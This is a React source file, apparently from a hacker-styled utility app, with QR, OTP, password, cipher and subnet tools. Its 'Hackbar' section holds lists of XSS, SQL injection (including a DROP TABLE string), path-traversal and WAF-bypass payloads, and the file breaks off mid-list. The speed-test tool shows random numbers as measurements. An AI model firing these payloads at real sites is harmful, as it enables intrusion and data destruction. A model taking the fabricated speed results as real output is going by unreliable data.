import React, { useState, useEffect } from 'react';
import { ClearableInput } from '../components/ClearableInput';
import { ToolDef } from '../types';
import { CustomToolLayout } from '../components/CustomToolLayout';
import { useInputHistory } from '../utils/useInputHistory';
import { QRCodeCanvas } from 'qrcode.react';
import Barcode from 'react-barcode';
import * as OTPAuth from 'otpauth';
import { getBackendUrl } from '../config';
import { openExternalLink } from '../utils/openLink';
import { Copy, Check } from 'lucide-react';
import { BleClient } from '@capacitor-community/bluetooth-le';
import { CapacitorNfc } from '@capgo/capacitor-nfc';
import { Capacitor } from '@capacitor/core';

// Helper for Copy
function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button onClick={handleCopy} className="text-gray-500 hover:text-neon-green transition-colors" title="Copy">
      {copied ? <Check size={14} className="text-neon-green" /> : <Copy size={14} />}
    </button>
  );
}

// -----------------------------
// Barcode / QR Tool
// -----------------------------
export function QrGenTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: inputVal, setValue: setInputVal, handleKeyDown, saveToHistory } = useInputHistory('0123456791011');
  const [type, setType] = useState<'qr' | 'barcode'>('barcode');

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block mb-2">
          TARGET PAYLOAD OR URL
        </label>
        <ClearableInput
          autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
          type="text"
          value={inputVal}
          onChange={e => setInputVal(e.target.value)}
          onKeyDown={handleKeyDown}
          onBlur={() => saveToHistory()}
          placeholder="enter text or url (e.g. https://pwn.net)"
          className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
         onClear={() => setInputVal('')} />

        <div className="flex gap-4 mb-4">
          <button 
            onClick={() => setType('qr')}
            className={`flex-1 py-3 border rounded-xl text-xs font-bold tracking-widest transition-all ${type === 'qr' ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-neon-green/20 text-gray-400 hover:border-neon-green/50'}`}
          >
            QR CODE
          </button>
          <button 
            onClick={() => setType('barcode')}
            className={`flex-1 py-3 border rounded-xl text-xs font-bold tracking-widest transition-all ${type === 'barcode' ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-neon-green/20 text-gray-400 hover:border-neon-green/50'}`}
          >
            BARCODE
          </button>
        </div>

        <div className="border border-neon-green/20 bg-white p-8 rounded-2xl flex items-center justify-center min-h-[300px]">
          {inputVal ? (
            type === 'qr' ? (
              <QRCodeCanvas value={inputVal} size={200} fgColor="#000000" bgColor="#ffffff" />
            ) : (
              <Barcode value={inputVal} renderer="canvas" background="#ffffff" lineColor="#000000" />
            )
          ) : (
            <span className="text-gray-400 text-xs">Waiting for payload...</span>
          )}
        </div>
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// OTP Decoder
// -----------------------------
export function OtpDecoderTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: secret, setValue: setSecret, handleKeyDown, saveToHistory } = useInputHistory('');
  const [result, setResult] = useState<any>(null);
  const [timeLeft, setTimeLeft] = useState(30);
  const [timeOffset, setTimeOffset] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      const epoch = Math.round(new Date().getTime() / 1000.0) + timeOffset;
      const remaining = 30 - (epoch % 30);
      setTimeLeft(remaining);
      
      if (result?.valid && secret) {
        try {
          let totp = new OTPAuth.TOTP({ secret: OTPAuth.Secret.fromBase32(secret.trim()) });
          setResult((prev: any) => ({
            ...prev,
            token: totp.generate({ timestamp: new Date().getTime() + timeOffset * 1000 })
          }));
        } catch {
          // ignore
        }
      }
    }, 1000);
    return () => clearInterval(timer);
  }, [result?.valid, secret, timeOffset]);

  const handleDecode = (valToDecode?: string, offset: number = timeOffset) => {
    (document.activeElement as HTMLElement)?.blur();
    saveToHistory();
    const s = valToDecode ?? secret;
    if (!s) return;
    try {
      let totp = new OTPAuth.TOTP({ secret: OTPAuth.Secret.fromBase32(s.trim()) });
      setResult({
        token: totp.generate({ timestamp: new Date().getTime() + offset * 1000 }),
        uri: totp.toString(),
        valid: true
      });
    } catch {
      setResult({ valid: false, error: 'Invalid Base32 Secret' });
    }
  };

  const generateRandom = () => {
    const epoch = Math.round(new Date().getTime() / 1000.0);
    const newOffset = -(epoch % 30);
    setTimeOffset(newOffset);
    const newSecret = new OTPAuth.Secret({ size: 20 }).base32;
    setSecret(newSecret);
    handleDecode(newSecret, newOffset);
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block mb-2">
          BASE32 OTP SECRET
        </label>
        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={secret}
            onChange={e => {setSecret(e.target.value); setResult(null);}}
            onKeyDown={handleKeyDown}
            placeholder="enter base32 secret..."
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
           onClear={() => {setSecret(''); setResult(null); }} />
          <button
            onClick={generateRandom}
            className="shrink-0 w-full sm:w-auto px-6 py-4 border border-neon-green/50 text-neon-green bg-neon-green/5 rounded-xl hover:bg-neon-green hover:text-black transition-all text-xs font-bold uppercase tracking-widest whitespace-nowrap"
          >
            RANDOM
          </button>
        </div>
        
        <button
          onClick={() => handleDecode()}
          disabled={!secret}
          className="w-full bg-neon-green/[0.05] hover:bg-neon-green text-neon-green hover:text-black border border-neon-green transition-all font-bold text-xs uppercase tracking-widest rounded-xl p-4 flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed"
        >
          ANALYZE / DECODE
        </button>

        {result && (
          <div className="border border-neon-green/30 rounded-2xl p-5 bg-[#050505] space-y-4">
            <h3 className="text-gray-400 text-[10px] font-bold tracking-widest uppercase">ANALYSIS RESULT</h3>
            {result.valid ? (
              <>
                <div className="flex justify-between border-b border-white/5 pb-2">
                  <span className="text-gray-500 text-xs">STATUS</span>
                  <span className="text-green-400 text-xs font-bold">VALID BASE32</span>
                </div>
                <div className="flex justify-between border-b border-white/5 pb-2">
                  <span className="text-gray-500 text-xs">TIME REMAINING</span>
                  <div className="flex items-center gap-2">
                    <span className="text-neon-green text-[10px] font-bold w-4 text-right">{timeLeft}s</span>
                    <div className="w-24 h-1.5 bg-white/10 rounded-full overflow-hidden">
                       <div className="h-full bg-neon-green transition-all duration-1000 ease-linear" style={{ width: `${(timeLeft / 30) * 100}%` }} />
                    </div>
                  </div>
                </div>
                <div className="flex justify-between border-b border-white/5 pb-2 items-center">
                  <span className="text-gray-500 text-xs">CURRENT TOKEN</span>
                  <span className="text-neon-green text-2xl font-bold tracking-[0.25em]">{result.token}</span>
                </div>
                <div className="border border-white/10 rounded-lg p-3 bg-black/50 break-all text-[10px] text-gray-500">
                  {result.uri}
                </div>
              </>
            ) : (
              <div className="text-red-500 text-xs font-bold bg-red-500/10 border border-red-500/20 p-3 rounded-lg">
                {result.error}
              </div>
            )}
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Passwords
// -----------------------------
export function PasswordsTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [length, setLength] = useState(24);
  const [pwd, setPwd] = useState('');

  const generate = () => {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=';
    let p = '';
    const array = new Uint32Array(length);
    crypto.getRandomValues(array);
    for (let i = 0; i < length; i++) {
      p += charset[array[i] % charset.length];
    }
    setPwd(p);
  };

  // eslint-disable-next-line react-hooks/exhaustive-deps
  useEffect(() => { generate(); }, []);

  const getCrackTime = () => {
    const charsetSize = 92;
    const combinations = Math.pow(charsetSize, length);
    // Assuming 100 billion guesses per second
    let seconds = combinations / 1e11;
    
    if (seconds < 1) return '< 1 second';
    if (seconds < 60) return `${Math.round(seconds)} seconds`;
    if (seconds < 3600) return `${Math.round(seconds / 60)} minutes`;
    if (seconds < 86400) return `${Math.round(seconds / 3600)} hours`;
    if (seconds < 31536000) return `${Math.round(seconds / 86400)} days`;
    if (seconds < 3153600000) return `${Math.round(seconds / 31536000)} years`;
    
    // Convert to scientific notation if ridiculously large
    const years = seconds / 31536000;
    if (years > 1e6) {
      if (!isFinite(years)) return 'Infinity';
      return `${years.toExponential(2)} years`;
    }
    return `${Math.round(years).toLocaleString()} years`;
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex justify-between mb-2">
          <span>ENTROPY LENGTH</span>
          <span className="text-neon-green">{length} CHARS</span>
        </label>
        <input 
          type="range" 
          min="8" max="64" 
          value={length} 
          onChange={e => setLength(Number(e.target.value))} 
          className="w-full accent-neon-green"
        />

        <div className="border border-neon-green/30 bg-[#050505] rounded-2xl p-6 text-center shadow-[0_0_15px_rgba(57,255,20,0.05)]">
           <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-3">GENERATED HASH</p>
          <div className="text-neon-green text-xl md:text-2xl font-mono break-all font-bold tracking-widest">{pwd}</div>
        </div>

        <div className="flex justify-between items-center text-xs border border-white/5 bg-black/40 p-4 rounded-xl">
           <span className="text-gray-500 font-bold tracking-widest uppercase text-[10px]">EST. CRACK TIME (100B/s)</span>
           <span className="text-white font-mono">{getCrackTime()}</span>
        </div>

        <button
          onClick={generate}
          className="w-full bg-neon-green/[0.05] hover:bg-neon-green text-neon-green hover:text-black border border-neon-green transition-all font-bold text-xs uppercase tracking-widest rounded-xl p-4 flex items-center justify-center"
        >
          GENERATE NEW HASH
        </button>
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Speed Test 
// -----------------------------
export function SpeedTestTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [testing, setTesting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [results, setResults] = useState<{ping: number, down: number, up: number} | null>(null);

  const startTest = () => {
    setTesting(true);
    setProgress(0);
    setResults(null);
    let p = 0;
    const interval = setInterval(() => {
      p += 2;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setTesting(false);
        setResults({
          ping: Math.floor(Math.random() * 50) + 12,
          down: Math.floor(Math.random() * 800) + 200,
          up: Math.floor(Math.random() * 400) + 50
        });
      }
    }, 50);
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-8 block">
        <div className="text-center">
          <p className="text-gray-400 text-xs mb-8">EVALUATING PACKET LATENCY AND BANDWIDTH LIMITS.</p>
          <button
            onClick={startTest}
            disabled={testing}
            className="w-40 h-40 rounded-full border-4 border-neon-green/20 bg-[#0a0a0a] text-neon-green font-bold uppercase tracking-widest text-lg md:text-xl relative mx-auto flex items-center justify-center overflow-hidden disabled:opacity-50 transition-all hover:scale-105 hover:border-neon-green hover:shadow-[0_0_30px_rgba(57,255,20,0.2)]"
          >
            {testing ? (
              <div className="absolute inset-0 bg-neon-green/10 flex items-center justify-center">
                <span className="z-10">{progress}%</span>
                <div 
                  className="absolute bottom-0 left-0 right-0 bg-neon-green/20 transition-all duration-75"
                  style={{ height: `${progress}%` }}
                />
              </div>
            ) : (
             results ? 'RESCAN' : 'START'
            )}
          </button>
        </div>

        {results && (
          <div className="grid grid-cols-3 gap-4 border-t border-neon-green/20 pt-8 mt-8">
            <div className="text-center">
              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">PING</p>
              <p className="text-neon-green text-2xl font-bold">{results.ping} <span className="text-xs text-gray-500">ms</span></p>
            </div>
            <div className="text-center border-l border-r border-neon-green/10">
              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">DOWNLOAD</p>
              <p className="text-neon-green text-2xl font-bold">{results.down} <span className="text-xs text-gray-500">Mbps</span></p>
            </div>
            <div className="text-center">
              <p className="text-gray-500 text-[10px] font-bold uppercase tracking-widest mb-1">UPLOAD</p>
              <p className="text-neon-green text-2xl font-bold">{results.up} <span className="text-xs text-gray-500">Mbps</span></p>
            </div>
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Base 64 / Cipher Decoder
// -----------------------------
export function CipherTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: inputVal, setValue: setInputVal, handleKeyDown, saveToHistory } = useInputHistory('');
  const [outputVal, setOutputVal] = useState('');
  const [mode, setMode] = useState<'encode' | 'decode' | 'analyze'>('encode');
  const [algo, setAlgo] = useState<'base64' | 'hex' | 'url' | 'rot13' | 'binary' | 'morse' | 'atbash' | 'reverse' | 'base32'>('base64');

  const rot13 = (s: string) => s.replace(/[a-zA-Z]/g, c => {
    const charCode = c.charCodeAt(0) + 13;
    const limit = c <= 'Z' ? 90 : 122;
    return String.fromCharCode(limit >= charCode ? charCode : charCode - 26);
  });

  const atbash = (s: string) => s.replace(/[a-zA-Z]/g, c => {
    const isUpper = c <= 'Z';
    const charCode = c.charCodeAt(0);
    const base = isUpper ? 65 : 97;
    return String.fromCharCode(base + (25 - (charCode - base)));
  });

  const MORSE_CODE_MAP: Record<string, string> = { "A": ".-", "B": "-...", "C": "-.-.", "D": "-..", "E": ".", "F": "..-.", "G": "--.", "H": "....", "I": "..", "J": ".---", "K": "-.-", "L": ".-..", "M": "--", "N": "-.", "O": "---", "P": ".--.", "Q": "--.-", "R": ".-.", "S": "...", "T": "-", "U": "..-", "V": "...-", "W": ".--", "X": "-..-", "Y": "-.--", "Z": "--..", "1": ".----", "2": "..---", "3": "...--", "4": "....-", "5": ".....", "6": "-....", "7": "--...", "8": "---..", "9": "----.", "0": "-----", ",": "--..--", ".": ".-.-.-", "?": "..--..", "/": "-..-.", "-": "-....-", "(": "-.--.", ")": "-.--.-", " ": "/" };
  const REVERSE_MORSE = Object.fromEntries(Object.entries(MORSE_CODE_MAP).map(([k,v]) => [v,k]));

  const base32chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
  const base32encode = (s: string) => {
    let result = ""; let buffer = 0; let bitsLeft = 0;
    for (let i = 0; i < s.length; i++) {
      buffer = (buffer << 8) | s.charCodeAt(i); bitsLeft += 8;
      while (bitsLeft >= 5) { result += base32chars[(buffer >> (bitsLeft - 5)) & 31]; bitsLeft -= 5; }
    }
    if (bitsLeft > 0) result += base32chars[(buffer << (5 - bitsLeft)) & 31];
    const padding = result.length % 8; return padding > 0 ? result + "=".repeat(8 - padding) : result;
  };
  const base32decode = (s: string) => {
    let result = ""; let buffer = 0; let bitsLeft = 0;
    for (let i = 0; i < s.length; i++) {
      if (s[i] === "=") break;
      const index = base32chars.indexOf(s[i].toUpperCase());
      if (index === -1) continue;
      buffer = (buffer << 5) | index; bitsLeft += 5;
      if (bitsLeft >= 8) { result += String.fromCharCode((buffer >> (bitsLeft - 8)) & 255); bitsLeft -= 8; }
    }
    return result;
  };

  const analyze = (str: string) => {
    let result = '';
    if (/^[A-Za-z0-9+/=]+$/.test(str) && str.length % 4 === 0) result += '• Detected Base64 format\n';
    if (/^[A-Z2-7=]+$/.test(str.toUpperCase())) result += '• Detected Base32 format\n';
    if (/^[0-9A-Fa-f]+$/.test(str)) result += '• Detected Hexadecimal string\n';
    if (/^[01\s]+$/.test(str)) result += '• Detected Binary string\n';
    if (/^[\.\-\/\s]+$/.test(str)) result += '• Detected Morse Code\n';
    if (/%[0-9A-Fa-f]{2}/.test(str)) result += '• Detected URL Encoding\n';
    if (result === '') result = '• No standard formats detected. Pure plaintext or custom cipher?';
    return result;
  };

  useEffect(() => {
    if (!inputVal) {
      setOutputVal('');
      return;
    }
    if (mode === 'analyze') {
      setOutputVal(analyze(inputVal));
      return;
    }
    
    try {
      if (mode === 'encode') {
        if (algo === 'base64') setOutputVal(btoa(inputVal));
        if (algo === 'url') setOutputVal(encodeURIComponent(inputVal));
        if (algo === 'hex') setOutputVal(Array.from(inputVal).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join(''));
        if (algo === 'rot13') setOutputVal(rot13(inputVal));
        if (algo === 'atbash') setOutputVal(atbash(inputVal));
        if (algo === 'binary') setOutputVal(Array.from(inputVal).map(c => c.charCodeAt(0).toString(2).padStart(8,'0')).join(' '));
        if (algo === 'morse') setOutputVal(inputVal.toUpperCase().split('').map(c => MORSE_CODE_MAP[c] || c).join(' '));
        if (algo === 'reverse') setOutputVal(inputVal.split('').reverse().join(''));
        if (algo === 'base32') setOutputVal(base32encode(inputVal));
      } else {
        if (algo === 'base64') setOutputVal(atob(inputVal));
        if (algo === 'url') setOutputVal(decodeURIComponent(inputVal));
        if (algo === 'hex') {
          const hex = inputVal.replace(/[^0-9A-Fa-f]/g, '');
          let str = '';
          for (let i = 0; i < hex.length; i += 2) str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
          setOutputVal(str);
        }
        if (algo === 'rot13') setOutputVal(rot13(inputVal)); // rot13 is its own inverse
        if (algo === 'atbash') setOutputVal(atbash(inputVal)); // atbash is its own inverse
        if (algo === 'binary') setOutputVal(inputVal.replace(/[^01]/g,'').match(/.{1,8}/g)?.map(b => String.fromCharCode(parseInt(b, 2))).join('') || 'ERROR');
        if (algo === 'morse') setOutputVal(inputVal.split(' ').map(c => REVERSE_MORSE[c] || c).join('').replace(/\//g, ' '));
        if (algo === 'reverse') setOutputVal(inputVal.split('').reverse().join(''));
        if (algo === 'base32') setOutputVal(base32decode(inputVal));
      }
    } catch {
      setOutputVal('MALFORMED INPUT STRING.');
    }
  }, [inputVal, mode, algo]);

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <div className="flex gap-2 sm:gap-4 overflow-x-auto pb-2 scrollbar-none">
          {['encode', 'decode', 'analyze'].map(m => (
            <button 
              key={m}
              onClick={() => setMode(m as any)}
              className={`flex-1 min-w-[80px] py-3 border rounded-xl text-[10px] sm:text-xs uppercase font-bold tracking-widest transition-all ${mode === m ? 'bg-neon-green/10 border-neon-green text-neon-green' : 'border-neon-green/20 text-gray-400 hover:border-neon-green/50'}`}
            >
              {m}
            </button>
          ))}
        </div>

        {mode !== 'analyze' && (
          <div className="flex flex-wrap gap-2">
             {['base64', 'base32', 'hex', 'binary', 'url', 'rot13', 'atbash', 'morse', 'reverse'].map(a => (
                <button 
                  key={a}
                  onClick={() => setAlgo(a as any)}
                  className={`px-3 py-1.5 border rounded-full text-[10px] uppercase font-bold tracking-widest transition-all ${algo === a ? 'bg-neon-green/20 border-neon-green text-neon-green' : 'border-white/10 text-gray-500 hover:border-white/30'}`}
                >
                  {a}
                </button>
             ))}
          </div>
        )}

        <div>
          <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block mb-2">
            RAW INPUT
          </label>
          <textarea
            value={inputVal}
            onChange={e => setInputVal(e.target.value)}
            onKeyDown={handleKeyDown}
            onBlur={() => saveToHistory()}
            className="w-full bg-[#050505] border border-neon-green/20 focus:border-neon-green rounded-xl p-4 text-neon-green font-mono text-xs outline-none transition-all h-32 resize-none"
            placeholder="enter datablock (e.g. aGVsbG8...)"
          />
        </div>
        
        <div>
          <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block mb-2">
            {mode === 'analyze' ? 'ANALYSIS REPORT' : 'PROCESSED OUTPUT'}
          </label>
          <textarea
            value={outputVal}
            readOnly
            className={`w-full bg-[#030303] border ${outputVal === 'MALFORMED INPUT STRING.' ? 'border-red-500/50 text-red-500' : 'border-neon-green/20 text-white'} rounded-xl p-4 font-mono text-xs outline-none transition-all h-32 resize-none`}
            placeholder="output data..."
          />
        </div>
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Notes Vault
// -----------------------------
export function NotesTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [notes, setNotes] = useState(() => localStorage.getItem('pwnnet_notes') || '');

  const handleSave = (val: string) => {
    setNotes(val);
    localStorage.setItem('pwnnet_notes', val);
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-4 block h-full flex flex-col">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex items-center justify-between">
          <span>DECRYPTED SCRATCHPAD</span>
          <span className="bg-neon-green/10 text-neon-green px-2 py-0.5 rounded border border-neon-green/30">AUTO-SAVED</span>
        </label>
        
        <textarea
          value={notes}
          onChange={e => handleSave(e.target.value)}
          placeholder="enter payloads, targets, or thoughts here..."
          className="w-full bg-[#050505] border border-neon-green/20 focus:border-neon-green focus:shadow-[0_0_15px_rgba(57,255,20,0.1)] rounded-xl p-4 text-white font-mono text-sm outline-none transition-all resize-none min-h-[400px]"
          spellCheck={false}
        />
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// IP Calculation
// -----------------------------
export function IpCalcTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: ip, setValue: setIp, handleKeyDown, saveToHistory } = useInputHistory('192.168.1.1/24');
  const [result, setResult] = useState<any>(null);

  const calculate = () => {
    (document.activeElement as HTMLElement)?.blur();
    saveToHistory();
    try {
      const parts = ip.split('/');
      const address = parts[0];
      const cidr = parts[1] || '24';
      
      const ipParts = address.split('.').map(Number);
      if (ipParts.length !== 4 || ipParts.some(isNaN) || Number(cidr) < 0 || Number(cidr) > 32) throw new Error();
      
      let mask = ~(2 ** (32 - Number(cidr)) - 1);
      let net = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
      let networkNode = new Uint32Array([net & mask])[0];
      let broadcastNode = new Uint32Array([net | ~mask])[0];

      const toIp = (num: number) => [(num >>> 24) & 255, (num >>> 16) & 255, (num >>> 8) & 255, num & 255].join('.');
      
      setResult({
        address,
        cidr,
        network: toIp(networkNode),
        broadcast: toIp(broadcastNode),
        hosts: Math.max(0, (2 ** (32 - Number(cidr))) - 2)
      });
    } catch(e) {
      setResult({ error: 'INVALID FORMAT. USE IP/CIDR (E.G. 10.0.0.1/24)' });
    }
  };

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest block mb-2">
          IPv4 ADDRESS / CIDR
        </label>
        <div className="flex flex-col sm:flex-row gap-3">
          <ClearableInput
            autoCapitalize="none" autoCorrect="off" autoComplete="off" spellCheck={false}
            type="text"
            value={ip}
            onChange={e => {setIp(e.target.value); setResult(null);}}
            onKeyDown={handleKeyDown}
            className="bg-[#050505] border border-neon-green/20 focus-within:border-neon-green rounded-xl text-xs"
            placeholder="enter network subnet (e.g. 192.168.1.1/24)"
           onClear={() => {setIp(''); setResult(null); }} />
          <button
            onClick={calculate}
            className="shrink-0 px-6 py-4 sm:py-0 border border-neon-green text-black bg-neon-green rounded-xl hover:bg-neon-green/80 transition-all text-xs font-bold uppercase whitespace-nowrap shadow-[0_0_10px_rgba(57,255,20,0.2)] hover:shadow-[0_0_15px_rgba(57,255,20,0.5)]"
          >
            CALCULATE
          </button>
        </div>

        {result && (
          <div className="border border-neon-green/30 rounded-2xl p-5 bg-[#050505] space-y-4">
            <h3 className="text-gray-400 text-[10px] font-bold tracking-widest uppercase">SUBNET DETAILS</h3>
            {result.error ? (
              <div className="text-red-500 text-xs font-bold bg-red-500/10 border border-red-500/20 p-3 rounded-lg">
                {result.error}
              </div>
            ) : (
              <div className="grid grid-cols-2 gap-4">
                 <div className="border border-white/5 rounded-lg p-3 bg-black/40">
                   <p className="text-gray-500 text-[10px] font-bold mb-1">NETWORK</p>
                   <p className="text-neon-green font-bold text-xs">{result.network}</p>
                 </div>
                 <div className="border border-white/5 rounded-lg p-3 bg-black/40">
                   <p className="text-gray-500 text-[10px] font-bold mb-1">BROADCAST</p>
                   <p className="text-neon-green font-bold text-xs">{result.broadcast}</p>
                 </div>
                 <div className="border border-white/5 rounded-lg p-3 bg-black/40 col-span-2">
                   <p className="text-gray-500 text-[10px] font-bold mb-1">USABLE HOSTS</p>
                   <p className="text-white font-bold text-lg">{result.hosts.toLocaleString()}</p>
                 </div>
              </div>
            )}
          </div>
        )}
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Security Check
// -----------------------------
export function SecurityCheckTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const [scanning, setScanning] = useState(false);
  const [results, setResults] = useState<{ id: string, name: string, status: 'pass' | 'fail' | 'warn', message: string, fix?: string }[] | null>(null);

  const scan = () => {
    setScanning(true);
    setResults(null);
    
    setTimeout(() => {
      const checks = [
        {
          id: 'https',
          name: 'HTTPS Encryption',
          status: (window.location.protocol === 'https:' ? 'pass' : 'fail') as 'pass' | 'fail' | 'warn',
          message: window.location.protocol === 'https:' ? 'Connection is secure via HTTPS.' : 'Connecting via unencrypted HTTP.',
          fix: 'Always access sensitive applications over HTTPS. Ensure SSL certificates are properly configured.'
        },
        {
          id: 'cookies',
          name: 'Third-Party Cookies',
          status: (navigator.cookieEnabled ? 'warn' : 'pass') as 'pass' | 'fail' | 'warn',
          message: navigator.cookieEnabled ? 'Browser is accepting cookies.' : 'Cookies are disabled.',
          fix: 'Consider disabling third-party cookies or using strict tracking protection in your browser settings.'
        },
        {
          id: 'do_not_track',
          name: 'Do Not Track (DNT)',
          status: (navigator.doNotTrack === '1' ? 'pass' : 'warn') as 'pass' | 'fail' | 'warn',
          message: navigator.doNotTrack === '1' ? 'DNT header is enabled.' : 'DNT header is missing or disabled.',
          fix: 'Enable the "Do Not Track" request in your browser privacy settings.'
        },
        {
          id: 'plugins',
          name: 'Plugin Exposure',
          status: (navigator.plugins.length > 0 ? 'fail' : 'pass') as 'pass' | 'fail' | 'warn',
          message: `Browser exposes ${navigator.plugins.length} active plugins.`,
          fix: 'Disable unnecessary browser plugins or extensions, as they can be used for fingerprinting.'
        }
      ];
      setResults(checks);
      setScanning(false);
    }, 1500);
  };

  useEffect(() => { scan(); }, []);

  return (
    <CustomToolLayout tool={tool} onClose={onClose}>
      <div className="space-y-6 block">
        <label className="text-gray-500 text-[10px] font-bold uppercase tracking-widest flex items-center justify-between mb-4">
          <span>CLIENT-SIDE VULNERABILITY REPORT</span>
          <button 
            onClick={scan} 
            disabled={scanning}
            className="bg-neon-green/10 text-neon-green border border-neon-green/30 px-3 py-1 rounded text-[10px] font-bold uppercase tracking-wider disabled:opacity-50 hover:bg-neon-green hover:text-black transition-all"
          >
            {scanning ? 'SCANNING...' : 'RESCAN'}
          </button>
        </label>

        {scanning ? (
           <div className="flex flex-col items-center justify-center p-12 border border-neon-green/20 rounded-xl bg-[#050505]">
             <div className="w-8 h-8 rounded-full border-2 border-neon-green/20 border-t-neon-green animate-spin mb-4" />
             <p className="text-neon-green text-xs font-mono tracking-widest uppercase">EVALUATING SECURITY PROFILE...</p>
           </div>
        ) : results ? (
           <div className="space-y-4">
             {results.map(r => (
               <div key={r.id} className="border border-white/5 bg-[#050505] rounded-xl p-5 relative overflow-hidden">
                 <div className="flex items-start justify-between mb-2">
                   <h3 className="text-white font-bold tracking-widest text-sm uppercase">{r.name}</h3>
                   <span className={`px-2 py-0.5 rounded text-[10px] font-bold uppercase tracking-widest border ${
                     r.status === 'pass' ? 'bg-green-500/10 text-green-400 border-green-500/30' :
                     r.status === 'fail' ? 'bg-red-500/10 text-red-400 border-red-500/30' :
                     'bg-yellow-500/10 text-yellow-400 border-yellow-500/30'
                   }`}>
                     {r.status}
                   </span>
                 </div>
                 <p className="text-gray-400 text-xs font-mono">{r.message}</p>
                 {r.fix && r.status !== 'pass' && (
                   <div className="mt-3 p-3 bg-white/5 border border-white/10 rounded-lg text-gray-300 text-xs leading-relaxed font-mono">
                     <span className="text-yellow-400 font-bold mr-2">RECOMMENDATION:</span>
                     {r.fix}
                   </div>
                 )}
               </div>
             ))}
           </div>
        ) : null}
      </div>
    </CustomToolLayout>
  );
}

// -----------------------------
// Advanced Hackbar
// -----------------------------
export function HackbarTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }) {
  const { value: url, setValue: setUrl, handleKeyDown, saveToHistory } = useInputHistory('https://example.com?id=');
  const [activeTab, setActiveTab] = useState<'XSS' | 'SQLi' | 'LFI' | 'WAF_BYPASS' | 'RESPONSE'>('XSS');
  const [copied, setCopied] = useState(false);
  const [loading, setLoading] = useState(false);
  const [response, setResponse] = useState<{status?: number, data?: string, error?: string} | null>(null);

  const payloads = {
    XSS: [
      '<script>alert(1)</script>',
      '"><img src=x onerror=prompt(1)>',
      'javascript:alert(1)//',
      '<svg/onload=alert(1)>',
      '\'"-prompt(1)-\'"',
      '"><details/open/ontoggle=prompt(1)>',
      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(prompt)(1)',
      '<w contenteditable id=x onfocus=alert(1)>'
    ],
    SQLi: [
      "' OR 1=1--",
      "admin' --",
      "' UNION SELECT 1,2,3--",
      "1; DROP TABLE users",
      "1' ORDER BY 1--+",
      "' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--",
      "1' UNION SELECT NULL,NULL,NULL-- -",
      "admin' OR '1'='1'/*"
    ],
    LFI: [
      '../../../../etc/passwd',
      'php://filter/convert.base64-encode/resource=index.php',
      '/var/www/html/index.php',
      '....//....//etc/passwd',
      'php://filter/read=string.rot13/resource=index.php',
      '../../../../../../../../windows/system32/drivers/etc/hosts',
      '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
    ],
    WAF_BYPASS: [
      '<sCrIpt>alert(1)</sCrIpt>',
      'SEL%0aECT',
      '<svg/on+load=alert(1)>',
      '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
      '<<SCRIPT>alert(1);//<</SCRIPT>',
